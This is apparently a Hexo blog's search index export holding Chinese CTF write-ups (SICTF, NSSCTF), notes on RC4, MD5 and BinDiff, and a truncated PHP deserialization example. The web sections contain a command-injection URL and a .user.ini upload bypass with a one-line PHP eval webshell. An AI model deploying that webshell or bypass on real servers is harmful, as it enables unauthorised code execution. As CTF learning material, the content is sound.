<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sicctfwp</title>
    <link href="/2024/11/01/sicctfwp/"/>
    <url>/2024/11/01/sicctfwp/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Sigin"><a href="#Sigin" class="headerlink" title="Sigin"></a>Sigin</h2><p>打开网页后出现这个页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012216221.png" srcset="/img/loading.gif" lazyload><br>典型的robots协议，访问robots.txt<br>按照提示进入，发现一下界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012217411.png" srcset="/img/loading.gif" lazyload><br>在本地弄一个php环境跑一下出了这个</p><blockquote><p>system(get_deined_vars()[_GET)][W3lc0me_t0_SICTF.2024])  </p></blockquote><p>简单来说就是将W3lc0me_t0_SICTF.2024作为system的get参数，多亏了有蒋✌教,这里存在一个php特性就是不能过多的下划线要改为W3lc0me_t0[SICTF.2024这个才行</p><blockquote><p><a href="http://27.25.151.29:33218/wh3re_1s_thi5_fl4g.php?W3lc0me_t0%5BSICTF.2024=cat">http://27.25.151.29:33218/wh3re_1s_thi5_fl4g.php?W3lc0me_t0[SICTF.2024=cat</a> &#x2F;flag<br>SICTF{e79dbf83-bce6-4545-a9d7-53c527f3f13c} </p></blockquote><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Exc"><a href="#Exc" class="headerlink" title="Exc??"></a>Exc??</h2><p>感觉和之前moectf的一个很像，直接打开看看<br>将这个xlsx分为一下几个模块</p><ul><li>输入输出模块<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012230759.png" srcset="/img/loading.gif" lazyload></li><li>算法模块<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012231237.png" srcset="/img/loading.gif" lazyload><br>先看wrong格中的内容<blockquote><p>IF(C3&#x3D;D19,IF(F3&#x3D;G19,IF(I3&#x3D;J19,IF(L3&#x3D;D21,IF(O3&#x3D;G21,IF(R3&#x3D;J21,IF(U3&#x3D;D23,IF(X3&#x3D;G23,IF(AA3&#x3D;J23,</p></blockquote></li></ul><blockquote><p>IF(D13&#x3D;Q19,IF(G13&#x3D;T19,IF(J13&#x3D;W19,IF(D15&#x3D;Q21,IF(G15&#x3D;T21,IF(J15&#x3D;W21,IF(D17&#x3D;Q23,IF(G17&#x3D;T23,IF(J17&#x3D;W23,</p></blockquote><blockquote><p>IF(D31&#x3D;AT10,IF(G31&#x3D;AW10,IF(J31&#x3D;AZ10,IF(M31&#x3D;AT12,IF(P31&#x3D;AW12,IF(S31&#x3D;AZ12,IF(V31&#x3D;AT14,IF(Y31&#x3D;AW14,IF(AB31&#x3D;AZ14,”Accepted!”)))))))))))))))))))))))))))</p></blockquote><p>发现存在一个accpted，去找这个实现条件，发现是输入输出模块中的数要与算法模块中的紫色数据块相同<br>继续找紫色output的实现函数<br>分别如下<br>&#x3D;BITLSHIFT(CODE(C2),3)+BITLSHIFT(CODE(D2),4)+BITLSHIFT(CODE(E2),5)<br>第二个是<br>&#x3D;CODE(C2)*3+CODE(D2)*4+CODE(E2)*5<br>第三个是<br>&#x3D;CODE(C2)*CODE(D2)+CODE(D2)*CODE(E2)+CODE(E2)*CODE(C2)</p><p>解释一下几个函数<br>BITLSHIFT(number, shift_amount)：执行左移操作<br>CODE(text)：将文本转换为ASCII码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">enc = [<span class="hljs-number">3976</span>, <span class="hljs-number">5728</span>, <span class="hljs-number">5640</span>, <span class="hljs-number">4232</span>, <span class="hljs-number">5272</span>, <span class="hljs-number">3776</span>, <span class="hljs-number">6464</span>, <span class="hljs-number">6136</span>, <span class="hljs-number">5408</span>]<br>enc1 = [<span class="hljs-number">876</span>, <span class="hljs-number">1147</span>, <span class="hljs-number">1182</span>, <span class="hljs-number">824</span>, <span class="hljs-number">1082</span>, <span class="hljs-number">866</span>, <span class="hljs-number">1361</span>, <span class="hljs-number">1278</span>, <span class="hljs-number">1087</span>]<br>enc2 = [<span class="hljs-number">16511</span>, <span class="hljs-number">24822</span>, <span class="hljs-number">26991</span>, <span class="hljs-number">11999</span>, <span class="hljs-number">21215</span>, <span class="hljs-number">16374</span>, <span class="hljs-number">37800</span>, <span class="hljs-number">32739</span>, <span class="hljs-number">21505</span>]<br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9</span>):<br>    found = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 初始化找到标志</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>                <span class="hljs-comment"># 使用 and 代替 &amp;</span><br>                <span class="hljs-keyword">if</span> (i * <span class="hljs-number">8</span> + j * <span class="hljs-number">16</span> + k * <span class="hljs-number">32</span> == enc[l] <span class="hljs-keyword">and</span> <br>                    i * <span class="hljs-number">3</span> + j * <span class="hljs-number">4</span> + k * <span class="hljs-number">5</span> == enc1[l] <span class="hljs-keyword">and</span> <br>                    i * j + j * k + k * i == enc2[l]):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(i)&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(k)&#125;</span>&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>                    found = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 设置找到标志</span><br>                    <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 跳出内层循环</span><br>            <span class="hljs-keyword">if</span> found:  <span class="hljs-comment"># 如果找到匹配，则跳出中间循环</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:  <span class="hljs-comment"># 如果找到匹配，则跳出外层循环</span><br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>SICTF{Exc31_1s_r3@lly_fun!}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nssctf2024秋季回顾</title>
    <link href="/2024/10/31/nssctf2024%E7%A7%8B%E5%AD%A3%E5%9B%9E%E9%A1%BE/"/>
    <url>/2024/10/31/nssctf2024%E7%A7%8B%E5%AD%A3%E5%9B%9E%E9%A1%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="nssctf2024秋季回顾"><a href="#nssctf2024秋季回顾" class="headerlink" title="nssctf2024秋季回顾"></a>nssctf2024秋季回顾</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛也算是打的比较舒服的一个比赛，不过后期有点懈怠了，有许多题都没有看主要是没有什么想法吧，回顾主要是把不会的和想学习的写一下，已经出来的就不打算再写了</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="NSS茶馆"><a href="#NSS茶馆" class="headerlink" title="NSS茶馆"></a>NSS茶馆</h3><p>这个题没想到是tea，最近接触少了，敏感度骤然下降，还是要好好把握一下</p><ul><li>先是查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312022329.png" srcset="/img/loading.gif" lazyload></li><li>老样子32位启动<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312040919.png" srcset="/img/loading.gif" lazyload><br>在这个图中的sub_411118便是我们的解密函数，判断函数<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312046855.png" srcset="/img/loading.gif" lazyload><br>tea本体<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312047549.png" srcset="/img/loading.gif" lazyload><br>解题脚本<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v,<span class="hljs-type">uint32_t</span> * k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">1131796</span>*<span class="hljs-number">33</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">1131796</span>;<br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>],k1=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">33</span>; i++)&#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="hljs-number">5</span>)+k1);<br>        sum -=delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint32_t</span> values[<span class="hljs-number">2</span>];<br>&#125; Data;<br><br><span class="hljs-comment">// unsigned char enc[] =</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//   0x65, 0xD2, 0x26, 0x3A, 0xB6, 0xA0, 0xD9, 0x81, 0x2A, 0x00, </span><br><span class="hljs-comment">//   0x5E, 0x0E, 0xE5, 0xEF, 0x07, 0x39, 0x57, 0xBC, 0xB6, 0x71, </span><br><span class="hljs-comment">//   0xA2, 0x0D, 0xAC, 0xE0</span><br><span class="hljs-comment">// &#125;;</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    Data v[<span class="hljs-number">3</span>]=&#123;&#123;<span class="hljs-number">0x3A26D265</span>,<span class="hljs-number">0x81D9A0B6</span>&#125;,&#123;<span class="hljs-number">0x0E5E002A</span>,<span class="hljs-number">0x3907EFE5</span>&#125;,&#123;<span class="hljs-number">0x71B6BC57</span>,<span class="hljs-number">0xE0AC0DA2</span>&#125;&#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0x0B</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2C</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">decrypt</span>(v[i].values,k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;decrtp:%x %x\n&quot;</span>,v[i].values[<span class="hljs-number">0</span>],v[i].values[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>结果是这个<br>decrtp:4e535343 54467b74<br>decrtp:65615f69 735f736f<br>decrtp:5f656173 7921217d<br>直接就是hex转chr了<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312118868.png" srcset="/img/loading.gif" lazyload><br>NSSCTF{tea_is_so_easy!!}</li></ul><h3 id="MD5爆破"><a href="#MD5爆破" class="headerlink" title="MD5爆破"></a>MD5爆破</h3><p>纯手撸，题解也看不懂，脚本都跑不动</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="怎么多了个没用的php文件"><a href="#怎么多了个没用的php文件" class="headerlink" title="怎么多了个没用的php文件"></a>怎么多了个没用的php文件</h3><p>开头就是一个文件上传页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011425977.png" srcset="/img/loading.gif" lazyload><br>我们选择一个文件直接上传，png可以上传，对php有过滤<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011439740.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011440878.png" srcset="/img/loading.gif" lazyload><br>然后我们尝试抓包并修改数据，可以成功上传，尝试访问<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011442332.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011442165.png" srcset="/img/loading.gif" lazyload><br>其中也尝试了其他的后缀，不过可以上传但是不可以解析，按照别人的wp来看，好像是uploads目录下有一个notion.php文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011454711.png" srcset="/img/loading.gif" lazyload><br>尝试上传.user.ini</p><blockquote><p>.user.ini 是⼀个⽤户⾃定义的php.ini ⽂件，会在其所在的当前⽬录⽣效，优先级⾼于php.ini<br>在user.ini中写⼊以下内容<br>auto_prepend_file &#x3D; &lt;filename&gt;    &#x2F;&#x2F;包含在⽂件头<br>auto_append_file &#x3D; &lt;filename&gt;      &#x2F;&#x2F;包含在⽂件尾<br>写⼊其中⼀个即可<br>&lt;filename&gt;就写成需要包含的⽂件名，后缀任意上传后，该⽬录下的php⽂件就会⾃动包含&lt;filename&gt;<br>.user.ini</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = 外部文件包含.png<br><span class="hljs-attr">auto_append_file</span> = 外部文件包含.png <br></code></pre></td></tr></table></figure><p>外部文件包含.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用蚁剑成功连接<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011528057.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011529825.png" srcset="/img/loading.gif" lazyload><br>NSSCTF{11822be1-0c76-4bc8-9f67-82fcf3f3ec33}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goldeneye_v1</title>
    <link href="/2024/10/31/goldeneye-v1/"/>
    <url>/2024/10/31/goldeneye-v1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>rc4</title>
    <link href="/2024/10/28/rc4/"/>
    <url>/2024/10/28/rc4/</url>
    
    <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>写题过程中会出现像rc4这种简单的对称加密算法，在此留下对应的解密脚本<br>由于初始化的s盒和产生的密钥流是由固定的密钥确定，并且加密的本质是异或所以为对称的<br>rc4加密主要分为三个部分</p><ul><li>初始化s盒</li><li>生成密钥流</li><li>加密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-comment"># 初始化S盒</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-keyword">return</span> S<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">yield</span> K<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key, data</span>):<br>    S = KSA(key)<br>    keystream = PRGA(S)<br>    res = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data:<br>        res.append(c ^ <span class="hljs-built_in">next</span>(keystream))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hash</title>
    <link href="/2024/10/28/hash/"/>
    <url>/2024/10/28/hash/</url>
    
    <content type="html"><![CDATA[<h1 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h1><p>打算了解一下各个hash算法的细节，防止在看到伪代码时不认识</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="MD5加密原理步骤"><a href="#MD5加密原理步骤" class="headerlink" title="MD5加密原理步骤"></a>MD5加密原理步骤</h3><ol><li>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行(N*512+448)</li><li>初始化变量,以大端字节序来表示，他们分别为： A&#x3D;0x01234567，B&#x3D;0x89ABCDEF，C&#x3D;0xFEDCBA98，D&#x3D;0x76543210（每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）</li><li>处理分组数据<br>以下是每次操作中用到的四个非线性函数（每轮一个）。<br>F( X ,Y ,Z ) &#x3D; ( X &amp; Y ) | ( (<del>X) &amp; Z )<br>G( X ,Y ,Z ) &#x3D; ( X &amp; Z ) | ( Y &amp; (</del>Z) )<br>H( X ,Y ,Z ) &#x3D;X ^ Y ^ Z<br>I( X ,Y ,Z ) &#x3D;Y ^ ( X | (~Z) )</li></ol><ul><li>MD5 是一种基于迭代和压缩的哈希函数，其核心是对输入数据进行多轮的位运算和逻辑操作。</li><li>常量值：MD5 使用特定的常量（如 0x67452301, 0xEFCDAB89 等）在计算过程中。如果在代码中看到这些特定的常量，特别是在加法操作中，通常指向 MD5 或类似算法。</li><li>处理输入数据的方式：MD5 通常处理输入数据为 512 位（64 字节）块，将每个块分为多个 32 位（4 字节）单元进行处理。</li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bindiff</title>
    <link href="/2024/10/28/bindiff/"/>
    <url>/2024/10/28/bindiff/</url>
    
    <content type="html"><![CDATA[<h1 id="用bindiff来显示二进制文件的区别"><a href="#用bindiff来显示二进制文件的区别" class="headerlink" title="用bindiff来显示二进制文件的区别"></a>用bindiff来显示二进制文件的区别</h1><p>你是否在面对收到攻击的二进制文件无法比对，看着两个文件而陷入迷茫，不知如何分析，沉沦在函数之海无法自拔，找不到patcher前后的区别，那么bindiff可以帮助你。</p><h3 id="1-自行安装"><a href="#1-自行安装" class="headerlink" title="1. 自行安装"></a>1. 自行安装</h3><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><p>首先我们打开一个我们所需要分析的软件，在ida完成分析之后我们退出将对应的.ida64包文件保存，然后加载patcher后的文件，在ida中键入crtl+6，使用bindiff插件<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281503232.png" srcset="/img/loading.gif" lazyload><br>选择Diff DAtabase，选择刚刚保存的.ida64文件,出现对应的对比框<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281504805.png" srcset="/img/loading.gif" lazyload><br>在这个绿色框口下我们发现，在最下方的函数extract_dirs_from_files，与原来的文件对比，有仅0.84的相似度，我们便可以知道两个二进制文件在这个函数发生了区别<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281506283.png" srcset="/img/loading.gif" lazyload><br>查看函数,在patcher中发现多了如下一个分支</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++">LABEL_7:<br>        <span class="hljs-keyword">if</span> ( v9 &amp;&amp; !v9[<span class="hljs-number">1</span>] )<br>        &#123;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">8</span>] = <span class="hljs-number">0x3F7D132A2A252822LL</span>;<br>          *(_QWORD *)lmao = <span class="hljs-number">0x7D2E370A180F1604LL</span>;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">24</span>] = <span class="hljs-number">0x31207C7C381320LL</span>;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">16</span>] = <span class="hljs-number">0x392A7F3F39132D13LL</span>;<br>          v18 = lmao;<br>          <span class="hljs-keyword">do</span><br>            *v18++ ^= **(_BYTE **)v7;<br>          <span class="hljs-keyword">while</span> ( &amp;lmao[<span class="hljs-number">31</span>] != v18 );<br>          <span class="hljs-built_in">puts</span>(lmao);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_9;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !dirname )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      component = <span class="hljs-built_in">last_component</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)v7);<br>      <span class="hljs-keyword">if</span> ( *component == <span class="hljs-number">46</span> )<br>      &#123;<br>        v17 = component[(component[<span class="hljs-number">1</span>] == <span class="hljs-number">46</span>) + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ( !v17 || v17 == <span class="hljs-number">47</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_7;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( *v9 == <span class="hljs-number">47</span> )<br>      &#123;<br></code></pre></td></tr></table></figure><p>我们经过cyberchef的函数爆破，来获得最终的数据，注意在数组中存在大小端序的问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281511684.png" srcset="/img/loading.gif" lazyload><br><a href="https://www.nssctf.cn/problem/3687">题目来源</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化例题</title>
    <link href="/2024/10/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/10/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>前期我们先以题带学，进行一下熟悉</p><h3 id="例题1-SWPUCTF-2021-新生赛-no-wakeup"><a href="#例题1-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="例题1 [SWPUCTF 2021 新生赛]no_wakeup"></a>例题1 [SWPUCTF 2021 新生赛]no_wakeup</h3><p>直接看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$Letmeseesee</span> = <span 